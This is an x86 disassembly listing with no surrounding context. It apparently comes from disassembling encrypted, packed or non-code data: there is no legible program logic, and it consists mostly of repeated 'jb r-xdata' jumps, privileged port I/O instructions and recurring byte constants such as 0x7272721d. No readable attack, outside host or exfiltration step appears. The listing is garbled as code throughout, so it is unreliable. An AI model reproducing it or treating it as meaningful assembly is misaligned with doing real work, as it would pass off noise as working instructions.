jb r-xdata
ror [ eax - 0x79774580 ] cl
test [ ebx - 0x59 ] ch
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
or cl [ edx ]
sbb eax 0x17bb0b1d
loop r-xdata
and al 0x1d
sbb eax 0xad2a46b
mov ecx 0x8a1d1d32
loop r-xdata
sbb eax 0xe2e26275
loop r-xdata
in eax dx
jb r-xdata
cmpsd [ esi ] [ edi ]
mov dl 0xb
jb r-xdata
cmpsd [ esi ] [ edi ]
and [ 0xffffffffa76b841d ] ebx
or cl [ ebx ]
imul ebx [ ecx + 0x1d ] 0xb2941d1d
test al 0x69
cmp cl [ ebx ]
jb r-xdata
imul edi [ edi - 0x48947bfa ] 0xffffffa0
jb r-xdata
loop r-xdata
mov edx 0x1d391d0b
sbb eax 0x72727272
or bh [ ecx ]
and [ 0x169f6f1d ] bl
mov eax [ 0x3264edfa ]
push ecx
sbb eax 0xc686611d
loop r-xdata
mov bh 0xb
popad
call 0x72b8b4ed
jb r-xdata
outsd
push edx
pop ds
sbb eax 0xa769b21d
0xb21de288 0x67ae
shl [ edx ] 0x1
jb r-xdata
sbb eax 0x7272721d
mov cl 0x1d
xchg esi eax
and eax 0xe3e2e0e2
loop r-xdata
0x691d1d05 0xb35
sbb eax 0x1a69e6b4
mov [ esi + 0x19180bb5 ] al
sbb eax 0x7272721d
test [ ebx - 0x59 ] ch
or [ ebx ] cl
mov cl 0x2a
sbb eax 0x7272721d
jb r-xdata
dec edx
adc eax 0xb41d1d1d
0xcea155ed 0x6784
mov dl 0xb
jb r-xdata
or [ eax ] 0x67bb1d1d
jb r-xdata
jmp 0x7262f137
push es
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
test [ ebx - 0x59 ] ch
in eax dx
pop si
out dx eax
loop r-xdata
jb r-xdata
xchg edi eax
or ch [ ebx - 0x59 ]
sbb bl [ 0x2267b6b5 ]
in eax dx
xor ax 0xe2e2
loop r-xdata
loope r-xdata
and eax 0xafb40aa7
test eax 0xbf80bb4
sbb eax 0xf888b11d
mov cl 0xb
push edx
xor al 0x1d
sbb eax 0x3ebf6b84
mov ecx 0x6b848188
mov edi 0x8438693c
imul edi [ edi - 0x2b7746fe ] 0xffffff84
imul ebx [ edi - 0x297742f6 ] 0xffffff84
imul esi [ edi - 0x60947b32 ] 0x8
mov ebp 0x1d5e130b
popad
lahf
out dx al
loop r-xdata
fistp [ esi + 0x66edd2c6 ]
in eax dx
jb r-xdata
mov [ 0xbe2e2ea ] al
sbb eax 0x2267bb1d
in eax dx
jb r-xdata
jb r-xdata
imul edi [ ebx ] 0x30e90bb8
sbb eax 0xb972721d
mov bh 0xa0
jb r-xdata
mov al [ 0xbb83b69 ]
mov edi 0xb76b8406
jb r-xdata
push 0xffffffb2
mov cl 0xb1
mov dh ah
mov cl 0xb
mov [ edi ] dh
or dl [ esi + 0x671d1d02 ]
and cl [ ebx ]
daa
adc bl [ 0x7272721d ]
mov dh ah
or edi [ edi ]
adc bl [ 0x7272721d ]
jb r-xdata
sbb eax 0xb35691d
out 0x56 eax
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
arpl [ esi ] cx
int1
and [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x17270b1d
jb r-xdata
aad 0xea
loop r-xdata
mov ebx 0x66ed2267
mov [ 0xbe2e2ea ] al
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
mov [ 0x1d1c750b ] al
sbb eax 0x84727272
test [ ebx - 0x59 ] ch
xor al 0x84
imul ebp [ edi - 0x457877ea ] 0xffffff88
mov es [ ebx + ebp * 2 - 0x7745eb59 ]
test [ ebx + ebp * 2 - 0x7745e559 ] al
imul ecx [ esi ] 0xe0620e63
loop r-xdata
cwd
das
sbb eax 0x9961841d
movsb [ edi ] [ esi ]
loop r-xdata
and ch ch
mov bh 0x69
push cs
int3
or al [ ecx - 0x44e2e2f8 ]
and ch ch
sbb eax 0x6b84721d
mov bh 0xc
mov [ edi + 0x6b843369 ] cl
or esp [ edi ]
jb r-xdata
and ch ch
jb r-xdata
outsd
cmpsd [ esi ] [ edi ]
push cs
mov dl 0xb5
or ebx [ ecx - 0x1b ]
loop r-xdata
cmp edi [ eax + 0x1d30e90b ]
jb r-xdata
sbb eax 0x84b97272
imul edi [ edi - 0x77c7965c ] 0xffffff81
test [ ebx - 0x41 ] ch
stosb [ edi ]
mov ecx 0xa8bf6b84
imul edi [ edx ] 0x1d21a70b
sbb eax 0xaa76b84
or ebp [ ecx + 0x59 ]
sbb eax 0xb2941d1d
mov eax 0x1d30e90b
jb r-xdata
mov ch 0x88
jb r-xdata
jb r-xdata
fucomi st0
jb r-xdata
jb r-xdata
test cl bl
sub eax 0x1d0a8c0b
sbb eax 0x72727272
sbb eax 0xe855ed1d
jpe r-xdata
jb r-xdata
loop r-xdata
mov cl 0xb4
mov [ esi + 0x1d56960b ] ah
sbb eax 0xc69edb72
shr ch cl
in ax dx
pop ss
jb r-xdata
push ebx
sbb eax 0x7272721d
jb r-xdata
imul esi [ edi - 0x58947bd4 ] 0x34
test [ ebx - 0x51 ] ch
push ss
mov [ edi - 0x7b717746 ] al
imul esp [ edi - 0x7b7745ec ] 0xffffff84
imul esp [ edi - 0x337745e6 ] 0xffffff84
imul esp [ edi - 0x35f445e8 ] 0x1d
sbb eax 0xa76b841d
xor cl [ ebx ]
pop ds
test [ ebx - 0x41 ] ch
movsb [ edi ] [ esi ]
imul edi [ eax ] 0x6b848188
mov edi 0x6b84b9aa
mov edi 0xb3a69a8
or ebp ecx
jb r-xdata
jb r-xdata
xchg ecx eax
jb r-xdata
jb r-xdata
push cs
jpe r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
imul esp [ esi + 0x1d2f100a ] 0x1d
popad
mov [ es : 0x1d33420b ] al
sbb eax 0x72727272
jb r-xdata
loop r-xdata
xor [ 0xffffffffb972721d ] bl
push ds
test [ ebx - 0x59 ] ch
sbb eax 0x1a0ba21d
jmp r-xdata
aaa
sbb al 0x8a
out 0xe3 al
loop r-xdata
imul esp [ edi - 0x7bdd2ee2 ] 0x6b
cmpsd [ esi ] [ edi ]
cmp bh [ edx + 0x32698f88 ]
mov [ ebx + 0x6b842369 ] al
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
arpl [ esi ] cx
lea eax [ ebx + ebp * 2 - 0x7745c359 ]
jb r-xdata
jb r-xdata
sbb bl [ 0xffffffffed22671d ]
out 0xe2 ax
loop r-xdata
xor dh [ edx - 0x4d995891 ]
or ecx [ edx + 0x15 ]
popad
sbb eax 0xeab41d1d
in eax dx
push ebp
mov eax [ 0x226784ce ]
in eax dx
sbb eax 0x11878a1d
mov ch 0x15
mov ch 0x6b
movsb [ edi ] [ esi ]
cmpsb [ esi ] [ edi ]
or dl [ eax ]
das
sbb eax 0xa226611d
or eax [ edx + 0x33 ]
sbb eax 0x7272721d
jb r-xdata
or ebx ebx
imul esp [ ebx ] 0x3aa76b84
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1d2e170b
sbb eax 0x72727272
0x691d1d05 0xb35
test cl bl
adc ebp ebp
mov cl 0xb4
mov ch 0xb
loope r-xdata
mov [ ebx + ebp * 2 - 0x7745fd59 ] es
test [ edx - 0x1d ] bl
loop r-xdata
jb r-xdata
jb r-xdata
adc dl cl
xor [ ebx ] cl
jecxz r-xdata
shr [ ebx ] 0x1
test [ ebx - 0x16 ] ch
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
push es
jb r-xdata
jb r-xdata
sbb eax 0xe637272
inc eax
imul ebp [ edi + 0x6a76906 ] 0x23
sbb bh ch
dec edx
jecxz r-xdata
retn 0x1d11
imul esp [ edi - 0x737745c4 ] 0xffffff84
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
in eax dx
jb r-xdata
jb r-xdata
or esp ebx
xor al 0x1d
sbb eax 0xed727272
fisubr [ es : edi - 0x59 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
sahf
out 0xe2 al
loop r-xdata
sbb eax 0x6372721d
mov dl 0xe0
loop r-xdata
push cs
jb r-xdata
jb r-xdata
xchg [ esi ] eax
mov cl 0x84
pop edx
jecxz r-xdata
push 0x34
sbb eax 0xe46e0b1d
loop r-xdata
cmp al 0xba
jb r-xdata
sbb eax 0x72727272
test [ ebx - 0x61 ] ch
or [ ebp + 0x1d5e130b ] bh
or ch [ edi + 0x19 ]
sbb eax 0xe40ba21d
xor [ 0x2055ed1d ] bl
outsd
mov edx 0xe72289e0
mov [ ecx ] edi
out 0x24 eax
out 0xd1 al
mov ch [ ecx - 0x41 ]
push ds
imul edi ecx 0xbe6b33e1
shr cl cl
test cl bl
jb r-xdata
mov edx 0x32698f88
jb r-xdata
loopne r-xdata
jb r-xdata
jb r-xdata
out dx al
outsd
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
mov [ esp + eax * 4 - 0x45fd5895 ] cl
jb r-xdata
sbb eax 0x64ed721d
jb r-xdata
jb r-xdata
jb r-xdata
jpe r-xdata
loop r-xdata
jb r-xdata
imul esp [ esi + 0x530bfec6 ] 0x19
jb r-xdata
sbb eax 0x17c50b1d
sbb eax 0x2a61721d
adc al 0x5
sbb eax 0xed22671d
sub dl [ edx + 0x25c28e90 ]
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x12
shl [ eax ] 0x1
and bh [ ebp + 0x212bb9bc ]
jb r-xdata
xor cl [ ebx ]
jb r-xdata
mov [ ecx + 0x698388bb ] dl
jb r-xdata
jb r-xdata
xchg edx eax
jb r-xdata
nop
jb r-xdata
add bh [ edx - 0x3df47878 ]
pop edx
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
fst [ ecx ]
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ebx 0x23698388
jb r-xdata
sbb eax 0xb41d721d
or edx [ ebx + 0x19 ]
jb r-xdata
mov es dx
jb r-xdata
retn 0xa725
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
adc [ 0x7272721d ] ebx
mov edx 0xc20b8788
jb r-xdata
push ebp
jb r-xdata
pop ebp
mov eax 0x84e2e295
fldcw [ 0x1d0a8c0b ]
or bl [ 0xffffffffe855ed1d ]
jb r-xdata
jb r-xdata
jb r-xdata
sub [ ecx + 0x23 ] 0xffffff84
jb r-xdata
0xf6c6bedb 0x66ed
sbb [ 0xffffffffb41d721d ] ebx
jb r-xdata
and eax 0x9b8a2ea7
xchg edx eax
xchg [ 0xffffffff949032a7 ] esp
retn 0xac2
jb r-xdata
cmpsd [ esi ] [ edi ]
mov bl [ cs : ebx - 0x58da786e ]
xor dl [ eax + 0xac2c294 ]
iretd
mov dl 0xa
xor [ edx + 0x1d ] dl
sbb eax 0x61f2a769
sbb eax 0x7272721d
jb r-xdata
cmp [ ecx ] 0x1d
in eax dx
xchg [ ebx ] ecx
jb r-xdata
push ebp
jb r-xdata
or esp [ 0x721d1d52 ]
test [ ebx - 0x41 ] ch
sbb [ eax + 0xb386981 ] cl
sub edx [ ecx + 0x1d ]
sbb eax 0x7a64ed72
xor ecx [ ebx ]
pop ebx
pop eax

sbb eax 0x72727221
jb r-xdata
jb r-xdata
and eax [ ebx + ebp * 2 - 0x7745c559 ]
jb r-xdata
sbb eax 0xeab41d72
jb r-xdata
push cs
sbb eax 0x6372721d
xchg [ edx ] ebx
loop r-xdata
or dh [ eax ]
push edx
sbb eax 0xf2a7691d
popad
sbb eax 0x7272721d
jb r-xdata
out dx al
or esp [ esi + 0x55 ]
xchg esp eax
mov dl 0xb
push esi
mov dl 0x1d
cmpsd [ esi ] [ edi ]
mov dl 0x1d
rcl [ ebx + 0x1d ] 0x1
sbb eax 0x6fee2661
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0x707745c6 ] 0x69
jb r-xdata
push ebp
retn 0x94aa
cmpsd [ esi ] [ edi ]
cmp cl [ ebp + 0x25848d91 ]
cmpsd [ esi ] [ edi ]
xchg esi eax
retn 0x94aa
sbb cl [ edx ]
jb r-xdata
jb r-xdata
and eax 0x90922aa7
jb r-xdata
jb r-xdata
pop esi
sbb eax 0x2eb60b1d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
mov edx 0x25b48c87
jb r-xdata
test [ ebx ] ebp
jb r-xdata
jb r-xdata
jb r-xdata
call 0xffffffff88b8b9e0
mov [ edi - 0x24f4cd97 ] cl
jb r-xdata
0xe2e72a0b 0x72e2
in eax dx
mov ch 0xb5
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
imul esi [ edx ] 0xe2e8db0b
jb r-xdata
sbb eax 0xd2b41db2
outsd
sub bl [ bx ]
sbb eax 0x3e1a0b1d
sbb eax 0x7272721d
shr [ ebx ] 0x1
and ch ch
jpo r-xdata
cwde
push edx
sbb eax 0x676fb11d
dec esi
mov ch 0xb
jb r-xdata
and eax 0xafaf3aa7
mov edx 0x3ea72587
jb r-xdata
cli
jb r-xdata
loopne r-xdata
jb r-xdata
loop r-xdata
mov [ ebp + 0x3ca76b84 ] cl
jb r-xdata
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
or eax eax
dec ebp
sbb eax 0xa725721d
or dh [ edi + ebp * 4 - 0x58da4b57 ]
push cs
scasd [ edi ]
test eax 0xa725afb4
mov edx 0x25b48c87
out dx eax
xor [ 0x7272721d ] bl
jb r-xdata
cmp ch [ edi + 0x2587baaf ]
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
xchg esi eax
mov [ bx ] ss
or dl [ eax + 0x22671d1d ]
in eax dx
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x971db21d
or [ ebx - 0x114896e3 ] 0xa
add ebp [ 0x1db21d1d ]
xchg edi eax
dec [ ebx ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xf93a151d
and bh [ ebx + 0x212b3a15 ]
jb r-xdata
test [ ebx - 0x61 ] ch
pop esp
imul ebx [ ecx ] 0x229f6b84
or eax [ edi + 0xd ]
sbb eax 0xcc88ba1d
mov ebp 0x3b0b8788
add [ 0xffffffff8472721d ] ebx
imul esp [ edi - 0x50947be2 ] 0x14
mov ebx 0xb206a76f
imul esp [ edi - 0x50947b16 ] 0x2b850a1a
push ebx
jb r-xdata
ror [ ebx ] 0x1
and eax 0x721d1d52
sbb eax 0x55ed721d
jb r-xdata
jb r-xdata
pop edi
sub [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
adc al 0x1d
or bl [ eax - 0x4ee2e2ae ]
outsd
dec esi
jb r-xdata
and eax 0x918d3aa7
lea eax [ ebp - 0x3d69c159 ]
stosb [ edi ]
xchg esp eax
or edi [ ebp ]
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esp [ esi - 0x1e ] 0xffffffe2
jb r-xdata
jb r-xdata
sbb eax 0xe697272
or eax [ ecx - 0x1c ]
loop r-xdata
fstp [ esi + 0x66edf6c6 ]
mov [ esi + 0x1d ] bl
sbb eax 0x1d2eb60b
sbb eax 0x72727272
jb r-xdata
mov ah 0xea
jb r-xdata
mov edx 0x6b848c88
jb r-xdata
imul esp [ edx + ebp * 2 - 0x1e ] 0xffffffe2
sub bl [ fs : 0x2e2f8a1d ]
loop r-xdata
jb r-xdata
jb r-xdata
call 0x1d782d5a
outsd
cmpsd [ esi ] [ edi ]
add cl [ ebx ]
movsd [ edi ] [ esi ]
xor al 0x1d
sbb eax 0x9602a725
jb r-xdata
imul esp [ edx + esi * 2 - 0x1e ] 0xffffffe2
loop r-xdata
xchg edi eax
sbb eax 0xad69bb1d
loop r-xdata
sbb eax 0xb5727272
jecxz r-xdata
jb r-xdata
imul esp [ edi - 0x787745fe ] 0xb
jb r-xdata
or edi [ ecx + 0x721d1d23 ]
jb r-xdata
xchg [ edx ] ch
sbb eax 0xe5058a1d
bound edx [ edi ]
mov ch 0xb
mov ecx 0x721d1d23
xchg esi eax
sub bl [ 0x2e2f8a1d ]
loop r-xdata
jb r-xdata
stosd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and al 0xb5
sbb eax 0x962e2f8a
or al [ esi - 0x75e2e2d6 ]
add eax 0xb51762e5
sbb eax 0x1d0a7e0b
sbb eax 0x72727272
jb r-xdata
mov ch 0x6b
sbb eax 0xc81fda8a
jb r-xdata
loope r-xdata
jb r-xdata
mov [ edi + 0x1d11c20b ] al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
loop r-xdata
enter 0xb570 0x6b
ficomp [ edi ]
jb r-xdata
or edx [ edx ]
pop ebx
sbb eax 0x7272721d
jb r-xdata
push ss
jb r-xdata
or eax edx
jb r-xdata
or ah [ esi + ebp ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cli
jb r-xdata
call 0xffffffffd228bcda
sub [ eax ] cl
sbb eax 0xb22671d
or ecx [ edx + 0x3b ]
sbb eax 0xc6961d1d
cli
imul esp [ edx + ecx ] 0x1d1d253c
mov ebx 0x67eead69
sub ebp ebp
jb r-xdata
sbb eax 0xe2e24e74
jb r-xdata
scasd [ edi ]
imul esp ebx 0xe11aab69
cmp eax 0x24611931
0xf7be6aa0 0xb41
jb r-xdata
jb r-xdata
loop r-xdata
outsd
sbb eax 0xea971d1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edx ] 0x1d4f3c0b
sbb eax 0x32a7691d
popad
and dh dh
imul esp [ edi + 0x35e60b1a ] 0x1d
sbb eax 0x72727272
imul esp [ edi + 0x72212bea ] 0x72727272
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ch 0x6b
imul esp [ edx + ecx ] 0x1d1d2af3
mov ebx 0x66ed2267
cmpsd [ esi ] [ edi ]
dec esi
jb r-xdata
sbb eax 0x72727272
jb r-xdata
in eax 0xe2
loop r-xdata
imul edi [ edi + 0xea60a0e ] 0x1d
sbb eax 0x67ee2661
and ch ch
jb r-xdata
loop r-xdata
or bl [ 0x1d1d ]
sbb eax 0x6fea971d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out 0x35 al
jb r-xdata
pop ds
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x59230b1d
sbb eax 0x7272721d
jb r-xdata
mov cl 0x1d
je r-xdata
out dx al
imul esp [ edx + esi * 4 + 0x1aa76bb2 ] 0xb216a76f
mov [ 0x1d20b60b ] bl
sbb eax 0xa2266172
mov al [ edi + 0x52 ]
stc
0xbb5
jb r-xdata
jb r-xdata
outsd
or edx [ eax + 0x9 ]
out dx al
xchg edi eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add edx [ bp + di + 0x1d ]
jb r-xdata
mov ch 0xb
mov [ 0x72e2e2e4 ] al
and cl [ ebx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jo r-xdata
jb r-xdata
outsd
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
movsd [ edi ] [ esi ]
jb r-xdata
jb r-xdata
loop r-xdata
imul edi [ edx + 0x27f30bc6 ] 0x72721d1d
jb r-xdata
outsd
jb r-xdata
jb r-xdata
jb r-xdata
fst [ ebx + 0x1d ]
imul ecx [ esi ] 0x9b70bb3
jb r-xdata
and ebp [ ecx - 0x66 ]
xchg [ esi ] ebx
push ebx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub bl [ 0x1fda8a1d ]
and al 0xa
sub bl [ 0x2267bb1d ]
into
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
imul esp [ edx + ecx ] 0x1d1d1046
popad
sbb eax 0x67f62661
and ch ch
jb r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
adc ax 0x1d5f
sbb eax 0xe61e9f61
or esp [ ebx ]
push ebx
mul [ es : edi + 0x22 ]
in eax dx
jb r-xdata
jb r-xdata
jne r-xdata
or bl [ esi ]
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
fisubr [ ecx + 0x1c ]
or eax [ edi + 0x721d1d0c ]
jb r-xdata
and bh [ ecx + edi * 4 + 0x7272212b ]
jb r-xdata
sbb eax 0x6372721d
fidiv [ edx - 0x121d1d59 ]
push cs
mov bl 0xb
sbb eax 0x619aa269
jb r-xdata
imul ebx [ edx - 0x39459602 ] 0x1d27f30b
jb r-xdata
jb r-xdata
0xc6ba69fe 0xf30b
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
cmp cl [ ebx ]
cmp al 0x4f
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x741da5b1
sbb eax 0x7272721d
xor al 0x9
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ecx
jb r-xdata
push edx
jne r-xdata
and ch ch
popad
and esp eax
test [ ecx - 0x25 ] ah
retn 0xa50b
sbb eax 0xbc72721d
daa
jb r-xdata
sbb eax 0xf6971d1d
mov dl 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
xor dh [ edx + 0xb3e971d ]
mov [ esi ] ebp
sbb eax 0xb572721d
sahf
salc
daa
jb r-xdata
loop r-xdata
mov [ 0x1e87619a ] al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or ebx [ ebp + 0xe ]
in eax dx
jb r-xdata
pop es
sbb al 0x1d
sbb eax 0x72727272
and cl [ bp + di ]
jb r-xdata
jb r-xdata
in al 0xe2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
mov bh 0x9
or eax eax
sbb [ 0x7272721d ] bl
jb r-xdata
sbb eax 0x72727272
jb r-xdata
bound ebx [ bx ]
sbb eax 0xb590a1d
sbb eax 0x6a76f1d
loopne r-xdata
in eax dx
and al 0xa
inc esi
adc [ 0xffffffffe31a611d ] bl
jb r-xdata
sbb eax 0xe5d0b1d
sbb eax 0xe31a611d
jb r-xdata
sbb eax 0x1db2f697
imul esp [ edi - 0x51f44eea ] 0x24
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
xchg edi eax
push es
sbb eax 0xa76bc2b5
push ds
or eax [ esi ]
xor bl [ 0x7272721d ]
jb r-xdata
dec edx
or edx [ ebx ]
mov ah 0xb5
mov al 0x5c
jb r-xdata
sbb eax 0x6d008a1d
jb r-xdata
popad
jb r-xdata
mov edx 0x27f30bc6
jb r-xdata
mov bh 0x16
push ss
jb r-xdata
add edx [ ebx + 0x1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
mov [ edx + 0x699088bd ] dl
and eax 0xf6a76b84
or esi [ edi ]
pop edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
outsd
or ecx [ edi + 0x17 ]
or ebx [ 0x6a76f1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop ds
push cs
popad
fcmovnb st2
or esp [ ebp + 0x721d1d51 ]
sbb eax 0x1d53d70b
sbb eax 0x72727272
mov cl 0x1d
xchg edi eax
sbb eax 0xe2e24675
loop r-xdata
in eax dx
fst [ bp + di + 0x1d ]
jb r-xdata
jb r-xdata
push eax
jb r-xdata
push ss
mov cl 0xb
scasb [ edi ]
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop edi
sbb eax 0x1e9f611d
out 0xb al
and edx [ ebx + 0x1d ]
sbb eax 0x72727272
scasd [ edi ]
mov ebx 0x130bb5ba
mov al [ eax ]
jb r-xdata
push ds
daa
or esi ebx
jb r-xdata
sbb eax 0xea971d1d
and al 0x2e
jb r-xdata
sbb eax 0x9aa2691d
jb r-xdata
loope r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out dx al
and eax 0x69bb1d1d
lodsd [ esi ]
jb r-xdata
loop r-xdata
jb r-xdata
or esi [ ecx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x6f72721d
sbb eax 0xb06a76f
dec edi
pop ss
test [ ebx - 0x61 ] ch
push cs
mov eax 0xdab76b84
imul ebx [ ebx + ecx ] 0x1d1d0c87
jb r-xdata
sub [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
loop r-xdata
mov esp 0x7272212b
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or [ 0x7272721d ] ebx
jb r-xdata
or ebp [ esi + 0x721d1d24 ]
jb r-xdata
0xaf6b84 0x890a
jb r-xdata
popad
in al 0xed
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
xor [ eax ] ebp
jb r-xdata
jb r-xdata
insd
sbb eax 0xe2e22e55
jb r-xdata
jb r-xdata
imul esp [ edx + 0x1e87619a ] 0x6923e1e2
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or edi [ edi + ecx * 2 ]
jb r-xdata
loop r-xdata
sub ebp ebp
sbb eax 0xeead69bb
rcr [ 0xffffffffe188b5b5 ] 0x1
or eax [ eax + 0x721d1d39 ]
jb r-xdata
sbb eax 0xbb5fab5
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ecx [ ecx + 0x721d1d2e ]
jb r-xdata
imul ebx [ esi - 0x6124313a ] 0xffffffc6
aas
sbb eax 0xed727272
jb r-xdata
jb r-xdata
mov ch 0xb
mov [ 0x611d1d57 ] eax
jb r-xdata
push cs
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
and al 0x1d
jb r-xdata
imul ebp [ edi + 0x24890a00 ] 0x1d
sbb eax 0xed2267bb
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
add bh [ ebx - 0x4df55891 ]
imul esp [ edi - 0x50947b16 ] 0x24890a00
sbb eax 0x2267bb1d
sbb eax 0xee0bceb5
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb eax 0x2bbc7272
and [ edx + 0x72 ] esi
jb r-xdata
sbb eax 0x676fea97
jb r-xdata
0xe21e8761 0x23e1
jb r-xdata
jb r-xdata
dec edi
jb r-xdata
mov cl 0xa5
jb r-xdata
loop r-xdata
cmp [ 0x55ed721d ] ebx
jb r-xdata
sbb eax 0xf150b1d
dec ebp
jb r-xdata
jb r-xdata
cli
imul esp [ edx + edi * 4 + 0x1d27b10a ] 0x1d
mov ch [ 0xffffffffb50cda09 ]
imul esp [ esi + edi * 4 + 0x1d27a70a ] 0x1d
mov ch [ edi ]
xchg esi eax
and al 0xb5
imul esp [ esi + ebp * 2 - 0x1e ] 0xffffffe2
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
mov dh 0x52
popad
sbb ah bl
sub esp [ ecx ]
sbb ah bl
jb r-xdata
sbb eax 0xe31a611d
in al 0xe3
loop r-xdata
mov edi 0xea60a0e
sbb eax 0xee26611d
and ch ch
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
in eax dx
add [ edx ] cl
mov [ ebx + 0x2267bb1d ] esp
jb r-xdata
pop ss
jb r-xdata
adc bl [ 0x7272721d ]
into
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
0x1e0a676f 0x1d1d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
xor [ ecx ] ebx
popad
and al 0xea
mov al [ 0x41f7be6a ]
or edx [ esp + ebx * 2 ]
sbb eax 0x7272721d
jb r-xdata
mov ah 0xda
imul edi [ edx ] 0x1d285f0b
sbb eax 0x72727272
jb r-xdata
imul esp [ 0xfffffffff6a76b84 ] 0x1d1b370b
sbb eax 0x72727272
jb r-xdata
loop r-xdata
sbb eax 0xd055ed72
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or al [ ebx - 0x1ee2e2c9 ]
jecxz r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
mov edi 0x16bf6b02
test cl bl
movsb [ edi ] [ esi ]
cmpsd [ esi ] [ edi ]
0x7272212b 0x7272
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ 0x13c20bee ] al
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
